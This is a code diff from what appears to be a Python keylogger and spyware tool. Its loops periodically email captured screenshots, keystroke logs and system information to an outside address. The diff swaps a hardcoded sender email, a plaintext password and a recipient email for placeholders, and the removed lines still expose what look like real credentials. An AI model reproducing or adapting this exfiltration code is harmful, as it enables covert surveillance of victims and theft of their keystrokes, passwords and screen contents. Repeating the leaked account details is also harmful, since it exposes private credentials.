@@ -183,8 +183,8 @@ def screenshot():
 # Send email with attachments
 def send_email(subject, body, to_email, attachments):
     try:
-        from_email = 'justtry202312@outlook.com'
-        password = 'Dt4T8hkE7$3Az'
+        from_email = 'ADD_SEND_EMAIL'
+        password = 'PASSWORD'
 
         msg = MIMEMultipart()
         msg['From'] = from_email
@@ -221,7 +221,7 @@ def periodic_screenshots_and_keystrokes():
             # Capture screenshot and keystrokes
             screenshot()
             attachments = ['screenshot.png', 'keystrokes.txt']
-            send_email('Periodic Screenshot and Keystrokes', 'Check out this screenshot and keystrokes!', 'ggu834476@gmail.com', attachments)
+            send_email('Periodic Screenshot and Keystrokes', 'Check out this screenshot and keystrokes!', 'ADD_SEND_TO_EMAIL', attachments)
 
             # Sleep for 2 minutes
             time.sleep(SCREENSHOT_INTERVAL)
@@ -236,7 +236,7 @@ def periodic_system_info():
             system_info = get_system_info()
             if system_info:
                 attachments = ['system_info.txt']
-                send_email('System Information', system_info, 'ggu834476@gmail.com', attachments)
+                send_email('System Information', system_info, 'ADD_SEND_TO_EMAIL', attachments)
 
             # Sleep for 2 hours
             time.sleep(SYSTEM_INFO_INTERVAL)
